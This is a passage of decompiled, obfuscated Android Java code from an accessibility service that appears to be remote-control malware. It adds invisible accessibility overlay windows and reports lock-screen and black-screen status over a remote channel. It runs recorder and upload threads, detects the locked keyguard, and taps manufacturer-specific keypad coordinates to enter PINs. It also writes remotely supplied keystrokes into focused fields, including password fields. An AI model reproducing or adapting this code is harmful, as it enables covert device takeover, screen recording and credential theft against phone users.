            Context applicationContext = getApplicationContext();
            fa0.q0(applicationContext, "SCH", "720");
            fa0.q0(applicationContext, "SCW", "1080");
            WindowManager windowManager = (WindowManager) getSystemService("window");
            FrameLayout frameLayout = new FrameLayout(this);
            WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(1, 1, 2032, 24, -3);
            layoutParams.gravity = 48;
            windowManager.addView(frameLayout, layoutParams);
            AtomicBoolean atomicBoolean = y0;
            if (!atomicBoolean.get()) {
                try {
                    FrameLayout frameLayout2 = new FrameLayout(e0);
                    WindowManager.LayoutParams layoutParams2 = new WindowManager.LayoutParams(1, 1, 2032, 10040, 8);
                    layoutParams2.gravity = 51;
                    a0.addView(frameLayout2, layoutParams2);
                    atomicBoolean.set(true);
                } catch (Exception unused4) {
                    atomicBoolean.set(false);
                }
            }
            b();
            c();
        } catch (Exception unused5) {
        }
        try {
            lm0 lm0Var = o71.f(this).e;
            String strV = t40.V(this);
            JSONObject jSONObject = new JSONObject();
            jSONObject.put(ApiConstants.ID, strV);
            jSONObject.put(ApiConstants.ACTION, "accessibility");
            jSONObject.put("locked", F0.get());
            jSONObject.put("isBlackScreen", J0.get());
            jSONObject.put("isProtected", I0.get());
            t40.w0(this, jSONObject);
            lm0Var.c(jSONObject.toString().getBytes());
        } catch (Exception unused6) {
        }
        if (!a8.e().g) {
            a8 a8VarE = a8.e();
            synchronized (a8VarE) {
                if (!a8VarE.g) {
                    a8VarE.b = getApplicationContext();
                    a8VarE.a = new w7(a8VarE.b);
                    a8VarE.e = Executors.newSingleThreadExecutor(new z7("Recorder-Thread", 0));
                    a8VarE.f = Executors.newSingleThreadExecutor(new z7("Upload-Thread", 0));
                    SharedPreferences sharedPreferences = a8VarE.b.getSharedPreferences("recorder", 0);
                    String string = sharedPreferences.getString("sessionId", null);
                    if (string == null) {
                        string = UUID.randomUUID().toString();
                        sharedPreferences.edit().putString("sessionId", string).apply();
                    }
                    a8VarE.i = string;
                    a8VarE.g = true;
                    a8VarE.f();
                }
            }
        }
        this.T = new pv(this, a0);
    }

    public final void p(String str) {
        if (str.contains(s90.e) || str.contains(s90.f)) {
            fa0.Q0(this, "PATH", "");
            sa0.b.clear();
        } else if (str.contains(s90.g)) {
            AtomicInteger atomicInteger = C0;
            if (atomicInteger.get() == 1) {
                fa0.Q0(this, "CLICK", "");
            } else if (atomicInteger.get() == 2) {
                fa0.Q0(this, "MIXCLICK", "");
            }
            sa0.a.clear();
        }
        if (str.contains(s90.a) || str.contains(s90.h)) {
            F0.set(true);
        }
        if (str.contains(s90.c)) {
            D0.set(false);
            E0 = new StringBuilder();
        }
    }

    public final void r(AccessibilityEvent accessibilityEvent, int i) {
        if ((i == 32 || i == 2048) && accessibilityEvent.getPackageName() != null) {
            String string = accessibilityEvent.getPackageName().toString();
            if ("com.android.systemui".equals(string) && b0.isKeyguardLocked()) {
                AtomicInteger atomicInteger = C0;
                int i2 = atomicInteger.get();
                HashMap map = P0;
                if (i2 == 1) {
                    WeakReference weakReference = xm0.c;
                    if ((weakReference == null || weakReference.get() == null) && !map.isEmpty()) {
                        xm0.a.post(new k1(this, 9));
                    }
                } else {
                    xm0.a();
                }
                if (!((PowerManager) getSystemService("power")).isInteractive() || n0.get() || j0.get()) {
                    return;
                }
                WeakReference weakReference2 = xm0.c;
                if (weakReference2 == null || weakReference2.get() == null || atomicInteger.get() != 1 || map.size() < 10) {
                    WeakReference weakReference3 = pk0.b;
                    if ((weakReference3 == null || weakReference3.get() == null) && o0.compareAndSet(false, true)) {
                        r0.execute(new o1(this, string, 0));
                    }
                }
            }
        }
    }

    public final void u(String str) {
        String strM;
        CharSequence hintText;
        AccessibilityNodeInfo rootInActiveWindow = getRootInActiveWindow();
        if (rootInActiveWindow == null) {
            return;
        }
        if (!l0.get() && D0.get() && C0.get() == 1) {
            u1 u1Var = new u1();
            u1Var.put("oppo", e70.a);
            u1Var.put("xiaomi", e70.c);
            u1Var.put("samsung", e70.b);
            u1Var.put("oneplus", e70.d);
            Map map = (Map) u1Var.get(Build.MANUFACTURER.toLowerCase());
            if (map != null) {
                if ("\b".equals(str)) {
                    str = "d";
                }
                float[] fArr = (float[]) map.get(str);
                if (fArr != null) {
                    d91.b(this, fArr[0], fArr[1]);
                    return;
                }
                return;
            }
            return;
        }
        AccessibilityNodeInfo accessibilityNodeInfoFindFocus = rootInActiveWindow.findFocus(1);
        if (accessibilityNodeInfoFindFocus == null || !accessibilityNodeInfoFindFocus.isEditable()) {
            return;
        }
        Bundle bundle = new Bundle();
        CharSequence text = accessibilityNodeInfoFindFocus.getText();
        String string = (Build.VERSION.SDK_INT < 26 || (hintText = accessibilityNodeInfoFindFocus.getHintText()) == null || !hintText.equals(text)) ? text != null ? text.toString() : "" : "";
        if ("\b".equals(str)) {
            if (string.isEmpty()) {
                return;
            } else {
                strM = string.substring(0, string.length() - 1);
            }
        } else {
            if ("\n".equals(str)) {
                accessibilityNodeInfoFindFocus.performAction(NatsJetStreamConstants.MAX_PULL_SIZE);
                u1 u1Var2 = new u1();
                u1Var2.put("oppo", e70.a);
                u1Var2.put("xiaomi", e70.c);
                u1Var2.put("samsung", e70.b);
                u1Var2.put("oneplus", e70.d);
                Map map2 = (Map) u1Var2.get(Build.MANUFACTURER.toLowerCase());
                if (map2 != null) {
                    float[] fArr2 = (float[]) map2.get(G0.get() ? "p" : "e");
                    if (fArr2 != null) {
                        d91.b(this, fArr2[0], fArr2[1]);
                        return;
                    }
                    return;
                }
                return;
            }
            if (accessibilityNodeInfoFindFocus.isPassword()) {
                if (E0.length() > string.length()) {
                    E0 = new StringBuilder(E0.substring(0, string.length()));
                }
                E0.append(str);
                strM = E0.toString();
            } else {
                strM = zn.m(string, str);
            }
        }
        bundle.putCharSequence("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", strM);
        accessibilityNodeInfoFindFocus.performAction(2097152, bundle);
        accessibilityNodeInfoFindFocus.recycle();
    }
}
